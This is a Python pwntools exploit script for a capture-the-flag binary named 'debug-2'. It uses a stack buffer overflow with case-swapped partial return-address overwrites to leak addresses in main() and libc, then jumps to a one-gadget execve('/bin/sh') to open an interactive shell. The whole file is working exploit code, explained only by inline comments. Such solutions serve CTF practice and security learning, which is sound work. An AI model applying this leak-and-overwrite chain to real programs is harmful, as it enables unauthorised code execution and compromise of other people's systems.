from pwn import *

elf = context.binary = ELF('./debug-2')
libc = ELF('./libc.so.6')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

context.log_level='debug'

#p = remote("ctf.cybr.club", 443, ssl=True, sni="debug-2")
p = remote('localhost', '1337')
#p = process('./debug-2')
#p = gdb.debug('./debug-2')

# Convert int address to bytearray
def tobytearray(a):
    # If first number in byte is a 0
    if (len(hex(a))%2==1):
        return bytearray.fromhex("0" + hex(a)[2:])
    return bytearray.fromhex(hex(a)[2:])

# Convert bytearray to int
def tohex(a):
    return int(a.hex(), 16)

# Converts characters in payload based on character conversion
def convert(a):
    x = tobytearray(a)
    for i in range(len(x)):
        if (x[i] >= 65 and x[i] <= 90):
            x[i] = x[i]+32
        elif (x[i] >= 97 and x[i] <= 122):
            x[i] = x[i]-32
    return tohex(x)



# Payload sends us back to menu() call in main(), allowing us to continue with leak obtained
menu = convert(tohex(tobytearray(tohex(b"\xdd"))[-1:]))
partial = cyclic(88) + tobytearray(menu)[::-1]

# Step 1: leak main() and move to menu() call in main()
p.recvuntil(b"3: Exit\n")
p.sendline("1")
p.recvuntil(b"string (max length of 69 characters):\n")
p.send(partial)
p.recvuntil(b"VAAA")
x = p.recvline()[:-1][::-1].hex()
print("leak of menu() call in main(): ", x)

# Found offset by subtracting menu() call in main()
elf.address = int(x, 16) - 0x00000000000013dd
print("Main address: ", hex(elf.sym["main"]))




# Step 2: move to menu() which makes next ret address a libc function

# ret = 0x00000000000013f4 ; used to deal with stack alignment
ret = elf.address + 0x00000000000013f4

print("Menu: ", hex(elf.sym["menu"]))
# we move to menu+1 for stack alignment, and so that scanf input does not break
payload = cyclic(88) + p64(convert(elf.sym["menu"] + 1))

p.recvuntil(b"3: Exit\n")
p.sendline("1")
p.recvuntil(b"string (max length of 69 characters):\n")
p.send(payload)




# Step 3: Leak libc (__libc_call_start_main) and pivot to right before main() is called in __libc_call_start_main
menu = convert(tohex(tobytearray(tohex(b"\x94"))[-1:]))
payload2 = cyclic(88) + tobytearray(menu)[::-1]


p.recvuntil(b"3: Exit\n")
p.sendline("1")
p.recvuntil(b"string (max length of 69 characters):\n")
p.send(payload2)

p.recvuntil(b"VAAA")
x = p.recvline()[:-1][::-1].hex()
print("leak of __libc_start_call_main+228: ", x)

# Found offset by subtracting __libc_start_call_main in given libc
libc.address = int(x, 16) - 228 - 0x0000000000023fb0
print("libc start address: ", hex(libc.address))

# Step 4: Use one-gadget to get code execution
"""
0x449d3 execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv
"""

one_gadget = libc.address + 0x449d3

# all conditions met, so we go to gadget
payload3 = cyclic(88) + p64(convert(one_gadget)) 

p.recvuntil(b"3: Exit\n")
p.sendline("1")
p.recvuntil(b"string (max length of 69 characters):\n")
p.sendline(payload3)

p.interactive()

